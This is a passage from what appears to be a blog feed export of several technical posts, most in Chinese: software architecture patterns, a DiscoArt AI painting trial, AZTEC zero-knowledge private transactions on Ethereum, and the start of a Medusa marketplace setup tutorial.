<li>像Django和Rails这样的Web框架<br><img src="/2018/05/21/10%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E6%A8%A1%E5%BC%8F/9.png"></li>
</ul>
<h3 id="九-黑板模式"><a href="#九-黑板模式" class="headerlink" title="九. 黑板模式"></a>九. 黑板模式</h3><p>这种模式对于没有确定解决方案策略的问题是有用的。黑板模式由3个主要组成部分组成。</p>
<ul>
<li>黑板——包含来自解决方案空间的对象的结构化全局内存</li>
<li>知识源——专门的模块和它们自己的表示</li>
<li>控制组件——选择、配置和执行模块<br>所有的组件都可以访问黑板。组件可以生成添加到黑板上的新数据对象。组件在黑板上查找特定类型的数据，并通过与现有知识源的模式匹配来查找这些数据。</li>
</ul>
<p>使用场景：</p>
<ul>
<li>语音识别</li>
<li>车辆识别和跟踪</li>
<li>蛋白质结构识别</li>
<li>声纳信号的解释<br><img src="/2018/05/21/10%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E6%A8%A1%E5%BC%8F/10.png"></li>
</ul>
<h3 id="十-解释器模式"><a href="#十-解释器模式" class="headerlink" title="十. 解释器模式"></a>十. 解释器模式</h3><p>这个模式用于设计一个解释用专用语言编写的程序的组件。它主要指定如何评估程序的行数，即以特定的语言编写的句子或表达式。其基本思想是为每种语言的符号都有一个分类。</p>
<p>使用场景：</p>
<ul>
<li>数据库查询语言，比如SQL</li>
<li>用于描述通信协议的语言<br><img src="/2018/05/21/10%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E6%A8%A1%E5%BC%8F/11.png"></li>
</ul>
<h3 id="体系架构模式的比较"><a href="#体系架构模式的比较" class="headerlink" title="体系架构模式的比较"></a>体系架构模式的比较</h3><p>下面给出的表格总结了每种体系架构模式的优缺点。</p>
<p>名称—优点—缺点<br>1.分层模式:<br>    - 一个较低的层可以被不同的层所使用。层使标准化更容易，因为我们可以清楚地定义级别。可以在层内进行更改，而不会影响其他层。<br>    - 不是普遍适用的。在某些情况下，某些层可能会被跳过。<br>2.客户端-服务器模式:<br>    - 很好地建立一组服务，用户可以请求他们的服务。<br>    - 请求通常在服务器上的单独线程中处理。由于不同的客户端具有不同的表示，进程间通信会导致额外开销。<br>3.主从设备模式:<br>    - 准确性——将服务的执行委托给不同的从设备，具有不同的实现。<br>    - 从设备是孤立的：没有共享的状态。主-从通信中的延迟可能是一个问题，例如在实时系统中。这种模式只能应用于可以分解的问题。<br>4.管道-过滤器模式:<br>    - 展示并发处理。当输入和输出由流组成时，过滤器在接收数据时开始计算。轻松添加过滤器，系统可以轻松扩展。过滤器可重复使用。可以通过重新组合一组给定的过滤器来构建不同的管道。<br>    - 效率受到最慢的过滤过程的限制。从一个过滤器移动到另一个过滤器时的数据转换开销。<br>5.代理模式:<br>    - 允许动态更改、添加、删除和重新定位对象，这使开发人员的发布变得透明。<br>    - 要求对服务描述进行标准化。<br>6.点对点模式:<br>    - 支持分散式计算。对任何给定节点的故障处理具有强大的健壮性。在资源和计算能力方面具有很高的可扩展性。<br>    - 服务质量没有保证，因为节点是自愿合作的。安全是很难得到保证的。性能取决于节点的数量。<br>7.事件总线模式:<br>    - 新的发布者、订阅者和连接可以很容易地添加。对高度分布式的应用程序有效。<br>    - 可伸缩性可能是一个问题，因为所有消息都是通过同一事件总线进行的。<br>8.模型-视图-控制器模式:<br>    - 可以轻松地拥有同一个模型的多个视图，这些视图可以在运行时连接和断开。<br>    - 增加复杂性。可能导致许多不必要的用户操作更新。<br>9.黑板模式:<br>    - 很容易添加新的应用程序。扩展数据空间的结构很简单。<br>    - 修改数据空间的结构非常困难，因为所有应用程序都受到了影响。可能需要同步和访问控制。<br>10.解释器模式:<br>    - 高度动态的行为是可行的。对终端用户编程性提供好处。提高灵活性，因为替换一个解释程序很容易。<br>    - 由于解释语言通常比编译后的语言慢，因此性能可能是一个问题。</p>
]]></content>
      <tags>
        <tag>架构模式</tag>
      </tags>
  </entry>
  <entry>
    <title>AIGC-绘画初体验</title>
    <url>/2022/10/27/AIGC-%E7%BB%98%E7%94%BB%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
    <content><![CDATA[<p>AI-Generated Content，字面意思是AI生产内容。AI写诗、AI作曲、AI绘画、AI换脸……甚至有创始人认为，游戏中导入图片生成模型的“捏脸系统”都是AIGC。</p>
<p><a href="https://jina.ai/product/disco-art/">https://jina.ai/product/disco-art/</a> 是较为直接的一个体验。</p>
<p>下图为其主页的静态展示：</p>
<p><img src="/2022/10/27/AIGC-%E7%BB%98%E7%94%BB%E5%88%9D%E4%BD%93%E9%AA%8C/1.png"></p>
<h3 id="在线体验"><a href="#在线体验" class="headerlink" title="在线体验"></a>在线体验</h3><p><a href="https://colab.research.google.com/github/jina-ai/discoart/blob/main/discoart.ipynb">https://colab.research.google.com/github/jina-ai/discoart/blob/main/discoart.ipynb</a></p>
<ol>
<li>按照python notebook的步骤，逐步启动。</li>
<li>Specify parameters，在制定参数的步骤，输入描述文字，目前只支持英文，并输入初始图片。就可以开始Preview了。</li>
</ol>
<p>非常的简单哦～。</p>
]]></content>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>AZTEC-基于ethereum的隐私交易-I-介绍</title>
    <url>/2019/07/29/AZTEC-%E5%9F%BA%E4%BA%8Eethereum%E7%9A%84%E9%9A%90%E7%A7%81%E4%BA%A4%E6%98%93-I-%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<h3 id="AZTEC"><a href="#AZTEC" class="headerlink" title="AZTEC"></a>AZTEC</h3><p><a href="https://github.com/AztecProtocol/AZTEC">AZTEC</a> 是一个高效的隐私协议，它运用了零知识证明（zero knowledge proofs）和同台加密（homomorphic encryption）来处理数值，并可对这些密文做特定的逻辑运算。这些密文可以保存在区块链上，对其做零知识证明验证，且不会泄露其明文。</p>
<h4 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h4><p>AZTEC 中的 note 是被加密的密文，是运算的基础单元，同时遵照了 UTXO 模型。</p>
<p><img src="/2019/07/29/AZTEC-%E5%9F%BA%E4%BA%8Eethereum%E7%9A%84%E9%9A%90%E7%A7%81%E4%BA%A4%E6%98%93-I-%E4%BB%8B%E7%BB%8D/utxo.png"></p>
<h4 id="互操作特性"><a href="#互操作特性" class="headerlink" title="互操作特性"></a>互操作特性</h4><p>所有基于 AZTEC 的 digital asset 都基于同一个智能合约—ACE（AZTEC Cryptography Engine）。ACE 主要有两个功能：1）针对指定的 ERC20 Token 合约生成 Proof 证明；2）验证 Proof，并更新 note 的状态。</p>
<h4 id="交易的隐私程度"><a href="#交易的隐私程度" class="headerlink" title="交易的隐私程度"></a>交易的隐私程度</h4><p>隐私性: 交易的所有信息不会被第三方得知。</p>
<p>匿名性: 交易内容是公开的，但是交易双方的身份是保密的。</p>
<p><strong>保密性: 交易内容是保密的，单交易双方的身份则是公开的。</strong></p>
<p>AZTEC 提供交易的保密性。但是通过第三方代理行为或者交易方多账户的行为可以实现交易的匿名性，进而实现完全的隐私性。</p>
<h4 id="功能介绍："><a href="#功能介绍：" class="headerlink" title="功能介绍："></a>功能介绍：</h4><p>目前AZTEC 提供了7个功能：</p>
<h5 id="1-Join-Split（转账）"><a href="#1-Join-Split（转账）" class="headerlink" title="1.Join Split（转账）"></a>1.Join Split（转账）</h5><p>Join Split 证明能将一个或者多个票据结合或者拆分成为一个或者多个票据，并保证输入和输出的票据综合一致。Join Split 也可以将 ERC20 的明文值转换为 AZTEC note 密文，或者将 AZTEC note 密文转回到 ERC20 明文。</p>
<h5 id="2-Bilateral-Swap（互换）"><a href="#2-Bilateral-Swap（互换）" class="headerlink" title="2.Bilateral Swap（互换）"></a>2.Bilateral Swap（互换）</h5><p>Bilateral Swap 证明能让使用者互换票据。例如用来互换代表两种资产的 note。次证明验证甲方提供的note == 乙方要求的note，同时，乙方提供的 note == 甲方要求的 note</p>
<h5 id="3-Dividend"><a href="#3-Dividend" class="headerlink" title="3.Dividend"></a>3.Dividend</h5><p>Dividend 能验证：输入 note 的值 == 输出 note 的值 * PublicFactor</p>
<p>次证明通常用来验证收到的利息是否正确。</p>
<h5 id="4-Mint"><a href="#4-Mint" class="headerlink" title="4.Mint"></a>4.Mint</h5><p>Mint 证明让可信的使用者能够增加 note 。例如，在转入账户收到稳定币后，产生一个等值的 AZTEC note。</p>
<h5 id="5-Burn"><a href="#5-Burn" class="headerlink" title="5.Burn"></a>5.Burn</h5><p>Burn 证明让可信的使用者能够销毁 note。例如，在转出稳定币给到他人后，销毁一个等值的 AZTEC note。</p>
<h5 id="6-Private-Range"><a href="#6-Private-Range" class="headerlink" title="6.Private Range"></a>6.Private Range</h5><p>Private Range 能验证：if note A 的值 &gt; note B 的值。例如，保证某资产小于另一个资产的值。</p>
<h5 id="7-Public-Range"><a href="#7-Public-Range" class="headerlink" title="7.Public Range"></a>7.Public Range</h5><p>Public Range 能验证：if note A 的值 &gt; int 的值。例如，保证某资产小于某门限值。</p>
<h4 id="隐私资产"><a href="#隐私资产" class="headerlink" title="隐私资产"></a>隐私资产</h4><p>AZTEC 提出了 <a href="https://github.com/ethereum/EIPs/issues/1724?source=post_page---------------------------">EIP 1724</a> ，旨在讲隐私资产接口标准化。</p>
<h4 id="AZTEC-示例"><a href="#AZTEC-示例" class="headerlink" title="AZTEC 示例"></a>AZTEC 示例</h4><p>伪代码:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (tradeNotional + assetBalance[buyer] &lt; regulatoryMax) &#123;</span><br><span class="line">  <span class="comment">//交易可以进行的逻辑内容</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 Private Range 证明：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;</span><br><span class="line">    proofData,</span><br><span class="line">&#125; = <span class="keyword">await</span> aztec.proof.privateRange.encodePrivateRangeTransaction(&#123;</span><br><span class="line">    originalNote: regulatoryMax,</span><br><span class="line">    comparisonNote: postTradeUserBalance,</span><br><span class="line">    senderAddress: accounts[<span class="number">0</span>],</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>以上生成 comparisonNote 的值小于 originalNote 的规则证明。加下来做规则验证：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(bytes memory _proofOutputs) = ACE.validateProof(</span><br><span class="line">    PRIVATE_RANGE_PROOF,</span><br><span class="line">    address(<span class="built_in">this</span>),</span><br><span class="line">    _proofData</span><br><span class="line">);</span><br><span class="line"><span class="comment">//交易可以进行的逻辑内容</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>零知识证明</tag>
      </tags>
  </entry>
  <entry>
    <title>AZTEC-基于ethereum的隐私交易-III-产品设计</title>
    <url>/2019/07/30/AZTEC-%E5%9F%BA%E4%BA%8Eethereum%E7%9A%84%E9%9A%90%E7%A7%81%E4%BA%A4%E6%98%93-III-%E4%BA%A7%E5%93%81%E8%AE%BE%E8%AE%A1/</url>
    <content><![CDATA[<h4 id="产品设计的关键步骤"><a href="#产品设计的关键步骤" class="headerlink" title="产品设计的关键步骤"></a>产品设计的关键步骤</h4><p>AZTEC 产品的关键步骤：1）生成 note；2）管理秘钥；3）验证 note</p>
<p>AZTEC中的<a href="https://www.npmjs.com/package/aztec.js">aztec.js</a>能够工作在浏览器或者手机程序中，生成 proof 大约需要 10ms，非常高效。</p>
<h4 id="1-生成-note"><a href="#1-生成-note" class="headerlink" title="1.生成 note"></a>1.生成 note</h4><p>证明（proof）中的保密 Token 需要用到 note。note 在票据登记所（note registry）中登记，proof 也在 note registry 中登记。</p>
<p>生成一个新的 note 需要 owner 的<code>publicKey</code>，所有人使用其地址证明其 owner 的身份，<code>value</code>是 note 中保密 Token 的值：</p>
<p><code>bobNote1 = await aztec.note.create(bob.publicKey, 100);</code></p>
<h4 id="2-管理秘钥"><a href="#2-管理秘钥" class="headerlink" title="2.管理秘钥"></a>2.管理秘钥</h4><p>每一个 note 都有一个对应的查看秘钥（viewing key）；同时还有一个对应的暂存秘钥（ephemeral key）。暂存秘钥用于恢复查看秘钥，同时 note 的 owner 的 private key 也可以恢复查看秘钥。</p>
<p>在服务器端，恢复查看秘钥并再次发送给到 owner 需要一套完备的管理系统，目前 AZTEC 还没有这样的系统。</p>
<p>在客户端，建议将暂存秘钥加密后保存起来。</p>
<h4 id="3-消费-note"><a href="#3-消费-note" class="headerlink" title="3.消费 note"></a>3.消费 note</h4><p>消费 note 使用标准的 Join Split 证明。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; proofData, expectedOutput, signatures &#125; = aztec.proof.joinSplit.encodeJoinSplitTransaction(&#123;</span><br><span class="line">  inputNotes: [bobNote1],</span><br><span class="line">  outputNotes: [sallyTaxiFee, bobNote2],</span><br><span class="line">  senderAddress: accounts[<span class="number">0</span>],</span><br><span class="line">  inputNoteOwners: [bob],</span><br><span class="line">  publicOwner: accounts[<span class="number">0</span>],</span><br><span class="line">  kPublic: <span class="number">0</span>,</span><br><span class="line">  validatorAddress: privateVenmoContract.address,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>kPublic是被转换的 ERC20 Token 的值。负值代表 ERC20 Token 被消耗，且转换为 note；正值代表将 note 兑换回到 ERC20 Token。且遵守<code>kPublic == outputNotes</code></p>
<p>Join Split证明是自动使用<code>inputNoteOwners: [bob]</code>的私钥来签名交易的。更加严谨的话可以使用<code>confidentialApprove</code>方法，例如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> signature = aztec.signer.signNote(assetAddress, noteHash, spenderAddress, owner.privateKey);</span><br><span class="line">ZkAsset.confidentialApprove(noteHash, spender, <span class="literal">true</span>, signature);</span><br></pre></td></tr></table></figure>

<p>最后再使用下面的语句最终消费掉 note：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> privateVenmoContract.confidentialTransfer(proofData, signatures, &#123;</span><br><span class="line">    <span class="keyword">from</span>: accounts[<span class="number">0</span>],</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="AZTEC-的交易流程"><a href="#AZTEC-的交易流程" class="headerlink" title="AZTEC 的交易流程"></a>AZTEC 的交易流程</h4><p><img src="/2019/07/30/AZTEC-%E5%9F%BA%E4%BA%8Eethereum%E7%9A%84%E9%9A%90%E7%A7%81%E4%BA%A4%E6%98%93-III-%E4%BA%A7%E5%93%81%E8%AE%BE%E8%AE%A1/txprocess.png"></p>
<p>如图所示，结合<a href="https://github.com/AztecProtocol/loan-dapp-starter-kit">借贷 DApp</a>，分析AZTEC的步骤：</p>
<h4 id="1-借贷-ZkAsset"><a href="#1-借贷-ZkAsset" class="headerlink" title="1.借贷 ZkAsset"></a>1.借贷 ZkAsset</h4><h5 id="1-1-构建-proof"><a href="#1-1-构建-proof" class="headerlink" title="1.1.构建 proof"></a>1.1.构建 proof</h5><p>用 aztec.js 构建 proof。即 proofData：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;</span><br><span class="line">   proofData,</span><br><span class="line">&#125; = aztec.proof.mint.encodeMintTransaction(&#123;</span><br><span class="line">        newTotalMinted: newTotalNote,</span><br><span class="line">        oldTotalMinted: oldTotalNote,</span><br><span class="line">        adjustedNotes: [loanNotionalNote],</span><br><span class="line">        senderAddress: loanDappContract.address,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h5 id="1-2-注册-note"><a href="#1-2-注册-note" class="headerlink" title="1.2.注册 note"></a>1.2.注册 note</h5><p>proof 可以被 Mint 成为新的 note，</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Loan(loanId).confidentialMint(MINT_PROOF, bytes(_proofData));</span><br></pre></td></tr></table></figure>

<h4 id="2-结算-ZkAsset"><a href="#2-结算-ZkAsset" class="headerlink" title="2.结算 ZkAsset"></a>2.结算 ZkAsset</h4><h5 id="2-1-批准-ACE-合约代表-owner-花费-ERC20-Token"><a href="#2-1-批准-ACE-合约代表-owner-花费-ERC20-Token" class="headerlink" title="2.1.批准 ACE 合约代表 owner 花费 ERC20 Token"></a>2.1.批准 ACE 合约代表 owner 花费 ERC20 Token</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> settlementToken.approve(aceContract.address, value);</span><br></pre></td></tr></table></figure>

<h5 id="2-2-构建-proof"><a href="#2-2-构建-proof" class="headerlink" title="2.2.构建 proof"></a>2.2.构建 proof</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; </span><br><span class="line">     proofData, </span><br><span class="line">     expectedOutput</span><br><span class="line">&#125; = aztec.proof.joinSplit.encodeJoinSplitTransaction(&#123;</span><br><span class="line">    inputNotes: [],</span><br><span class="line">    outputNotes: [Note1, Note2], <span class="comment">// note values sum to kPublic</span></span><br><span class="line">    senderAddress: account.address,</span><br><span class="line">    inputNoteOwners: [],</span><br><span class="line">    publicOwner: account.address,</span><br><span class="line">    kPublic: -value, </span><br><span class="line">    validatorAddress: joinSplitContract.address,</span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure>

<h5 id="2-3-批准-ACE-合约花费-ERC20-Token"><a href="#2-3-批准-ACE-合约花费-ERC20-Token" class="headerlink" title="2.3.批准 ACE 合约花费 ERC20 Token"></a>2.3.批准 ACE 合约花费 ERC20 Token</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> ACE.publicApprove(zkAsset.address, hashProof, kPublic, &#123;</span><br><span class="line">      <span class="keyword">from</span>: accounts[<span class="number">0</span>],</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h5 id="2-4-转发交易"><a href="#2-4-转发交易" class="headerlink" title="2.4.转发交易"></a>2.4.转发交易</h5><p>转发 proof 给到 ACE，proof 中的senderAddress与发起调用ACE.validateProof的msg.sender 需保持一致。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(bytes memory _proofOutputs) = ACE.validateProof(JOIN_SPLIT_PROOF, address(<span class="built_in">this</span>), _proofData);</span><br></pre></td></tr></table></figure>

<h5 id="2-5-处理转移指令-Transfer-Instructions"><a href="#2-5-处理转移指令-Transfer-Instructions" class="headerlink" title="2.5.处理转移指令(Transfer Instructions)"></a>2.5.处理转移指令(Transfer Instructions)</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">_loanVariables.settlementToken.confidentialTransferFrom(JOIN_SPLIT_PROOF, _proofOutputs.get(<span class="number">0</span>));</span><br></pre></td></tr></table></figure>

<h4 id="3-结算贷款处理"><a href="#3-结算贷款处理" class="headerlink" title="3.结算贷款处理"></a>3.结算贷款处理</h4><h5 id="3-1-批准结算合约来花费-note"><a href="#3-1-批准结算合约来花费-note" class="headerlink" title="3.1.批准结算合约来花费 note"></a>3.1.批准结算合约来花费 note</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> settlementSignature = signNote(</span><br><span class="line">   zkSettlementAsset.address,</span><br><span class="line">   settlementNoteHash,</span><br><span class="line">   loanId,</span><br><span class="line">   lender.privateKey);</span><br><span class="line"><span class="keyword">await</span> zkSettlementAsset.confidentialApprove(</span><br><span class="line">   settlementNoteHash,</span><br><span class="line">   loanId,</span><br><span class="line">   <span class="literal">true</span>,</span><br><span class="line">   settlementSignature, </span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">from</span>: lender.address,</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<h5 id="3-2-构建-proof"><a href="#3-2-构建-proof" class="headerlink" title="3.2.构建 proof"></a>3.2.构建 proof</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;</span><br><span class="line">     proofData,</span><br><span class="line">&#125; = aztec.proof.bilateralSwap.encodeBilateralSwapTransaction(&#123;</span><br><span class="line">        inputNotes: [takerBid, takerAsk],</span><br><span class="line">        outputNotes: [makerAsk, makerBid],</span><br><span class="line">        senderAddress: loanId,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>其中需要<code>takerBid == makerAsk</code> ; <code>takerAsk == makerBid</code></p>
<h5 id="3-3-终极交易并更新状态"><a href="#3-3-终极交易并更新状态" class="headerlink" title="3.3.终极交易并更新状态"></a>3.3.终极交易并更新状态</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(bytes memory _proofOutputs) = ACE.validateProof(BILATERAL_SWAP_PROOF, address(<span class="built_in">this</span>), _proofData);</span><br><span class="line">(bytes memory _loanProofOutputs) = _proofOutputs.get(<span class="number">0</span>);</span><br><span class="line">(bytes memory _settlementProofOutputs) = _proofOutputs.get(<span class="number">1</span>);</span><br><span class="line">settlementZkAsset.confidentialTransferFrom(BILATERAL_SWAP_PROOF, _settlementProofOutputs);</span><br><span class="line">loanZkAsset.confidentialTransferFrom(BILATERAL_SWAP_PROOF, _loanProofOutputs);</span><br></pre></td></tr></table></figure>

<p>由此完成了借贷以及结算，同时全部的账目均为保密。</p>
]]></content>
      <tags>
        <tag>零知识证明</tag>
      </tags>
  </entry>
  <entry>
    <title>4.Open source ecommerce platform for multi-vendor marketplaces</title>
    <url>/2022/04/27/4.Open%20source%20ecommerce%20platform%20for%20multi-vendor%20marketplaces/</url>
    <content><![CDATA[<p>I tried here <a href="https://github.com/adrien2p/medusa-extender#marketplace-tutorial">https://github.com/adrien2p/medusa-extender#marketplace-tutorial</a> for new medusa-server, the same as <a href="https://github.com/shahednasser/medusa-marketplace">https://github.com/shahednasser/medusa-marketplace</a>, but fail to “npm start”.</p>
<p>But we can run it buy code update directly step by step — <a href="https://dev.to/medusajs/create-an-open-source-commerce-marketplace-part-1-3m5k">https://dev.to/medusajs/create-an-open-source-commerce-marketplace-part-1-3m5k</a>, this is a guide to migrate exciting medusa-server to upgrade about “store_id”.</p>
<p>==================&gt; guide detail &lt;==================</p>
<p><a href="https://www.medusajs.com/">Medusa</a> is an open source headless commerce platform that allows you to create your own store in a matter of minutes. Part of what makes Medusa a good choice for your ecommerce store is its extensibility. <strong>Now, it is also possible to create multi-vendor marketplaces using Medusa</strong>.</p>
<p>To make things easier for our open source community, <a href="https://github.com/adrien2p">Adrien de Peretti</a>, one of our amazing contributors, created a Medusa module that allows you to extend anything and everything you want.</p>
<blockquote>
<p>“I’ve been looking for an e-commerce solution that could provide me with some core features while being fully customisable… After some research, where I found that none of the present solutions could provide what I needed, I chose Medusa as it provided me with many of the needed features while being easy to extend. I ended up loving the community atmosphere, especially the proximity with the team, and have been helping those in the community looking for a similar fully-customisable solution by sharing a part of my private project. This is how the medusa-extender was born.” — Adrien de Peretti</p>
</blockquote>
<p>In this tutorial, you’ll learn how to install and set up the Medusa Extender module on your Medusa server. You’ll then learn how to use its customization abilities to create a marketplace in your store! The marketplace will have multiple stores or vendors, and each of these stores will be able to add its own products. This tutorial will be the first part of a series that will explore all aspects of creating a marketplace.</p>
<h2 id="What-is-Medusa-Extender"><a href="#What-is-Medusa-Extender" class="headerlink" title="What is Medusa Extender"></a>What is Medusa Extender</h2><p><a href="https://github.com/adrien2p/medusa-extender">Medusa Extender</a> is an NPM package that you can add to your Medusa store to extend or customize its functionalities. The scope of its customization entails Entities, Repositories, Services, and more.</p>
<p>The Medusa Extender has many use cases aside the marketplace functionality. It can be used in many other use cases, such as adding custom fields, listening to events to perform certain actions like sending emails, customizing Medusa’s validation of request parameters, and more.</p>
<h2 id="What-You’ll-Be-Creating"><a href="#What-You’ll-Be-Creating" class="headerlink" title="What You’ll Be Creating"></a>What You’ll Be Creating</h2><p>In this article and the following parts of this series, you’ll learn how to create a marketplace using Medusa and Medusa Extender. A marketplace is an online store that allows multiple vendors to add their products and sell them.</p>
<p>A marketplace has a lot of features, including managing a vendor’s own orders and settings. This part of the tutorial will only showcase how to create stores for each user and attach the products they create to that store.</p>
<h2 id="Code-for-This-Tutorial"><a href="#Code-for-This-Tutorial" class="headerlink" title="Code for This Tutorial"></a>Code for This Tutorial</h2><p>If you want to follow along you can find the code for this tutorial in <a href="https://github.com/shahednasser/medusa-marketplace-tutorial">this repository</a>.</p>
<p>Alternatively, if you want to install the marketplace into your existing Medusa store, you can install the <a href="https://github.com/shahednasser/medusa-marketplace">Medusa Marketplace plugin</a>. This plugin is created with the code from this tutorial and will be updated with every new part of this series released.</p>
<h2 id="Prerequisites"><a href="#Prerequisites" class="headerlink" title="Prerequisites"></a>Prerequisites</h2><p>Before you follow along with this tutorial, make sure you have:</p>
<ol>
<li>A Medusa server instance was installed. You can follow along with our easy <a href="https://docs.medusajs.com/quickstart/quick-start">quickstart guide</a> to learn how you can do that.</li>
<li><a href="https://www.postgresql.org/download/">PostgreSQL</a> installed and your Medusa server connected to it.</li>
<li><a href="https://redis.io/download">Redis</a> installed and your Medusa server connected to it.</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl restart redis-server</span><br><span class="line">清楚redis 缓存数据</span><br><span class="line">➜  ~ redis-cli</span><br><span class="line">127.0.0.1:6379&gt; select</span><br><span class="line">(error) ERR wrong number of arguments for &#x27;select&#x27; command</span><br><span class="line">127.0.0.1:6379&gt; select 1</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379[1]&gt; FLUSHDB</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">➜  ~ sudo /etc/init.d/postgresql star</span><br><span class="line">[sudo] password for zhuang: </span><br><span class="line">➜  ~ </span><br><span class="line">➜  ~ sudo -i -u postgres</span><br><span class="line">postgres@elementoryos61:~$ psql</span><br><span class="line">psql (12.9 (Ubuntu 12.9-0ubuntu0.20.04.1))</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line">postgres=# CREATE DATABASE openharbor_marketplace_medusa;</span><br><span class="line">CREATE DATABASE</span><br><span class="line">postgres=# </span><br></pre></td></tr></table></figure>



<h2 id="Building-the-Marketplace"><a href="#Building-the-Marketplace" class="headerlink" title="Building the Marketplace"></a>Building the Marketplace</h2><h3 id="Project-Setup"><a href="#Project-Setup" class="headerlink" title="Project Setup"></a>Project Setup</h3><p>In the directory that holds your Medusa server, start by installing Medusa Extender using NPM:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm i medusa-extender</span><br></pre></td></tr></table></figure>



<p>It’s recommended that you use TypeScript in your project to get the full benefits of Medusa-Extender. To do that, create the file <code>tsconfig.json</code> in the root of the Medusa project with the following content:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;compilerOptions&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;module&quot;</span>: <span class="string">&quot;CommonJS&quot;</span>,</span><br><span class="line">    <span class="string">&quot;declaration&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;emitDecoratorMetadata&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;experimentalDecorators&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;allowSyntheticDefaultImports&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;moduleResolution&quot;</span>: <span class="string">&quot;node&quot;</span>,</span><br><span class="line">    <span class="string">&quot;target&quot;</span>: <span class="string">&quot;es2017&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sourceMap&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;skipLibCheck&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;allowJs&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;outDir&quot;</span>: <span class="string">&quot;dist&quot;</span>,</span><br><span class="line">    <span class="string">&quot;rootDir&quot;</span>: <span class="string">&quot;.&quot;</span>,</span><br><span class="line">    <span class="string">&quot;esModuleInterop&quot;</span>: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;include&quot;</span>: [<span class="string">&quot;src&quot;</span>, <span class="string">&quot;medusa-config.js&quot;</span>],</span><br><span class="line">  <span class="string">&quot;exclude&quot;</span>: [<span class="string">&quot;dist&quot;</span>, <span class="string">&quot;node_modules&quot;</span>, <span class="string">&quot;**/*.spec.ts&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Next, update the <code>scripts</code> key in <code>package.json</code> with the following content:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;seed&quot;</span>: <span class="string">&quot;medusa seed -f ./data/seed.json&quot;</span>,</span><br><span class="line">    <span class="string">&quot;build&quot;</span>: <span class="string">&quot;rm -rf dist &amp;&amp; tsc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;start&quot;</span>: <span class="string">&quot;npm run build &amp;&amp; node dist/src/main.js&quot;</span>,</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>



<p>These scripts will ensure that your TypeScript files will be transpiled before Medusa is run.</p>
<p>Then, create the file <code>main.ts</code> in the directory <code>src</code> with the following content:</p>
